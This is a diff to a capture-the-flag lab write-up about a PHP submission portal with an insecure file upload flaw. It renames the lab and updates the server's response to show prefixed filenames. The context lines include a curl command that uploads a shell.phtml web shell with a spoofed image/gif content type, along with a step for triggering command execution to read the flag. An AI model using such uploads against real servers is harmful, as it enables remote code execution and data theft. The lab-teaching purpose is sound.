@@ -9,7 +9,7 @@
 ---
 
 ### 1. Narrative Lore & Storyline Context
-In GICT Lab 207, Prof. Hasmukh Chelaiya set up an internal submission portal (`upload.php`) to collect assignment drafts and exam review questions. TA Piyush Pelaiya discovered that the server hosting this portal stored the upcoming **OOP 99** midterm exam flag in `/flag.txt`. By finding an insecure file upload flaw in the portal, Piyush managed to execute commands on the server to read and leak the confidential flag.
+In AU Lab 207, Prof. Hasmukh Chelaiya set up an internal submission portal (`upload.php`) to collect assignment drafts and exam review questions. TA Piyush Pelaiya discovered that the server hosting this portal stored the upcoming **OOP 99** midterm exam flag in `/flag.txt`. By finding an insecure file upload flaw in the portal, Piyush managed to execute commands on the server to read and leak the confidential flag.
 
 ---
 
@@ -58,9 +58,10 @@ curl -F "submission=@shell.phtml;type=image/gif" http://<LAN_IP>:5003/upload
 ```
 The server will respond:
 ```html
-SUBMISSION SUCCESSFUL: File saved as: shell.phtml
-Access link: /uploads/shell.phtml
+SUBMISSION SUCCESSFUL: File saved as: 0a1b2c_shell.phtml
+Access link: /uploads/0a1b2c_shell.phtml
 ```
+*(Note: To prevent multi-team overwrite collisions during concurrent lab triage, files are assigned an isolated prefix on disk while also maintaining a direct fallback for `/uploads/shell.phtml`).*
 
 #### Step 3: Trigger Command Execution to Retrieve Flag
 Open the file in the browser or via `curl`:
